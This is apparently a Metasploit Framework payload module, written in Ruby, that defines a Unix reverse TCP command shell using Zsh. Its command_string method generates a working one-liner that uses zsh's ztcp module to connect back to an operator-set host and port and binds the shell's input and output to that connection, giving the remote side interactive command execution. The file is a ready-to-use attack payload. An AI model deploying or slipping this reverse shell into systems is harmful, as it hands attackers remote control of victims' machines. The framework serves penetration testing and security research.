##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 94

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP (via Zsh)',
        'Description' => %q{
          Connect back and create a command shell via Zsh.  Note: Although Zsh is often
          available, please be aware it isn't usually installed by default.
        },
        'Author' => [
          'Doug Prostko <dougtko[at]gmail.com>', # Initial payload
          'Wang Yihang <wangyihanger[at]gmail.com>' # Simplified redirections
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'zsh',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
    register_advanced_options(
      [
        OptString.new('ZSHPath', [true, 'The path to the ZSH executable', 'zsh'])
      ]
    )
  end

  def generate(_opts = {})
    super + command_string
  end

  def command_string
    "#{datastore['ZSHPath']} -c 'zmodload zsh/net/tcp && ztcp #{datastore['LHOST']} #{datastore['LPORT']} && #{datastore['ZSHPath']} >&$REPLY 2>&$REPLY 0>&$REPLY'"
  end
end
